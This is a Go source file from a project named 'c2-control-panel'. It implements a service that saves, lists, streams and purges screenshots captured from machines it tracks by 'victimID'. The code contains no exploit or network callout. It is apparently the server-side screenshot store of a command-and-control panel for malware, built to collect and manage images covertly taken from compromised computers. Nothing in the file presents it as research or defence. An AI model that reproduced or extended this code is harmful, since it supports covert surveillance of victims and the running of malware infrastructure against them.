package services

import (
	"crypto/rand"
	"database/sql"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"time"

	"c2-control-panel/models"
)

// ScreenshotService handles screenshot storage and retrieval
type ScreenshotService struct {
	DB          *sql.DB
	StoragePath string
	BaseURL     string
}

// NewScreenshotService creates a new screenshot service
func NewScreenshotService(db *sql.DB, storagePath string, baseURL string) *ScreenshotService {
	// Create storage directory if it doesn't exist
	if err := os.MkdirAll(storagePath, 0755); err != nil {
		log.Printf("[Screenshot] Failed to create storage directory: %v", err)
	}
	
	return &ScreenshotService{
		DB:          db,
		StoragePath: storagePath,
		BaseURL:     baseURL,
	}
}

// generateFilename creates a unique filename for a screenshot
func (s *ScreenshotService) generateFilename(victimID string, format string) string {
	randomBytes := make([]byte, 8)
	rand.Read(randomBytes)
	randomStr := base64.URLEncoding.EncodeToString(randomBytes)[:10]
	
	timestamp := time.Now().Format("20060102_150405")
	return fmt.Sprintf("%s_%s_%s.%s", victimID, timestamp, randomStr, format)
}

// SaveScreenshot saves a screenshot to disk and database
func (s *ScreenshotService) SaveScreenshot(victimID string, imageData []byte, width, height int, format string) (*models.Screenshot, error) {
	// Generate filename
	filename := s.generateFilename(victimID, format)
	filePath := filepath.Join(s.StoragePath, filename)
	
	// Write file to disk
	if err := os.WriteFile(filePath, imageData, 0644); err != nil {
		return nil, fmt.Errorf("failed to write screenshot: %v", err)
	}
	
	// Save to database
	screenshot := &models.Screenshot{
		VictimID: victimID,
		Filename: filename,
		FilePath: filePath,
		Size:     int64(len(imageData)),
		Width:    width,
		Height:   height,
		Format:   format,
		TakenAt:  time.Now(),
	}
	
	query := `
		INSERT INTO screenshots (victim_id, filename, file_path, size, width, height, format, taken_at)
		VALUES ($1, $2, $3, $4, $5, $6, $7, $8)
		RETURNING id, created_at
	`
	
	err := s.DB.QueryRow(query,
		screenshot.VictimID,
		screenshot.Filename,
		screenshot.FilePath,
		screenshot.Size,
		screenshot.Width,
		screenshot.Height,
		screenshot.Format,
		screenshot.TakenAt,
	).Scan(&screenshot.ID, &screenshot.CreatedAt)
	
	if err != nil {
		os.Remove(filePath) // Clean up file on database error
		return nil, fmt.Errorf("failed to save screenshot to database: %v", err)
	}
	
	log.Printf("[Screenshot] Saved screenshot %s for victim %s (%d bytes)", filename, victimID, len(imageData))
	return screenshot, nil
}

// GetScreenshot retrieves a screenshot by ID
func (s *ScreenshotService) GetScreenshot(id int64) (*models.Screenshot, error) {
	screenshot := &models.Screenshot{}
	
	query := `
		SELECT id, victim_id, filename, file_path, size, width, height, format, taken_at, created_at
		FROM screenshots
		WHERE id = $1
	`
	
	err := s.DB.QueryRow(query, id).Scan(
		&screenshot.ID,
		&screenshot.VictimID,
		&screenshot.Filename,
		&screenshot.FilePath,
		&screenshot.Size,
		&screenshot.Width,
		&screenshot.Height,
		&screenshot.Format,
		&screenshot.TakenAt,
		&screenshot.CreatedAt,
	)
	
	if err != nil {
		return nil, err
	}
	
	return screenshot, nil
}

// GetScreenshotFile reads screenshot data from disk
func (s *ScreenshotService) GetScreenshotFile(id int64) ([]byte, string, error) {
	screenshot, err := s.GetScreenshot(id)
	if err != nil {
		return nil, "", err
	}
	
	data, err := os.ReadFile(screenshot.FilePath)
	if err != nil {
		return nil, "", fmt.Errorf("failed to read screenshot file: %v", err)
	}
	
	contentType := "image/" + screenshot.Format
	return data, contentType, nil
}

// ListScreenshots returns screenshots for a victim
func (s *ScreenshotService) ListScreenshots(victimID string, limit int) ([]models.Screenshot, error) {
	if limit <= 0 {
		limit = 50
	}
	
	query := `
		SELECT id, victim_id, filename, file_path, size, width, height, format, taken_at, created_at
		FROM screenshots
		WHERE victim_id = $1
		ORDER BY taken_at DESC
		LIMIT $2
	`
	
	rows, err := s.DB.Query(query, victimID, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	
	var screenshots []models.Screenshot
	for rows.Next() {
		var screenshot models.Screenshot
		err := rows.Scan(
			&screenshot.ID,
			&screenshot.VictimID,
			&screenshot.Filename,
			&screenshot.FilePath,
			&screenshot.Size,
			&screenshot.Width,
			&screenshot.Height,
			&screenshot.Format,
			&screenshot.TakenAt,
			&screenshot.CreatedAt,
		)
		if err != nil {
			log.Printf("[Screenshot] Error scanning row: %v", err)
			continue
		}
		screenshots = append(screenshots, screenshot)
	}
	
	return screenshots, nil
}

// DeleteScreenshot removes a screenshot from disk and database
func (s *ScreenshotService) DeleteScreenshot(id int64) error {
	screenshot, err := s.GetScreenshot(id)
	if err != nil {
		return err
	}
	
	// Delete from database first
	query := `DELETE FROM screenshots WHERE id = $1`
	_, err = s.DB.Exec(query, id)
	if err != nil {
		return fmt.Errorf("failed to delete screenshot from database: %v", err)
	}
	
	// Delete file from disk
	if err := os.Remove(screenshot.FilePath); err != nil {
		log.Printf("[Screenshot] Warning: failed to delete file %s: %v", screenshot.FilePath, err)
	}
	
	log.Printf("[Screenshot] Deleted screenshot %s", screenshot.Filename)
	return nil
}

// DeleteOldScreenshots removes screenshots older than the specified duration
func (s *ScreenshotService) DeleteOldScreenshots(olderThan time.Duration) (int, error) {
	cutoff := time.Now().Add(-olderThan)
	
	// Get screenshots to delete
	query := `SELECT id, file_path FROM screenshots WHERE taken_at < $1`
	rows, err := s.DB.Query(query, cutoff)
	if err != nil {
		return 0, err
	}
	defer rows.Close()
	
	count := 0
	for rows.Next() {
		var id int64
		var filePath string
		if err := rows.Scan(&id, &filePath); err != nil {
			log.Printf("[Screenshot] Error scanning row: %v", err)
			continue
		}
		
		// Delete file
		os.Remove(filePath)
		count++
	}
	
	// Delete from database
	deleteQuery := `DELETE FROM screenshots WHERE taken_at < $1`
	_, err = s.DB.Exec(deleteQuery, cutoff)
	if err != nil {
		return count, fmt.Errorf("failed to delete old screenshots from database: %v", err)
	}
	
	log.Printf("[Screenshot] Deleted %d old screenshots (older than %v)", count, olderThan)
	return count, nil
}

// GetTotalSize returns total storage size used by screenshots
func (s *ScreenshotService) GetTotalSize() (int64, error) {
	var totalSize int64
	query := `SELECT COALESCE(SUM(size), 0) FROM screenshots`
	err := s.DB.QueryRow(query).Scan(&totalSize)
	return totalSize, err
}

// StreamScreenshot streams a screenshot file to a writer (for HTTP responses)
func (s *ScreenshotService) StreamScreenshot(id int64, w io.Writer) (string, error) {
	screenshot, err := s.GetScreenshot(id)
	if err != nil {
		return "", err
	}
	
	file, err := os.Open(screenshot.FilePath)
	if err != nil {
		return "", fmt.Errorf("failed to open screenshot file: %v", err)
	}
	defer file.Close()
	
	_, err = io.Copy(w, file)
	if err != nil {
		return "", fmt.Errorf("failed to stream screenshot: %v", err)
	}
	
	contentType := "image/" + screenshot.Format
	return contentType, nil
}
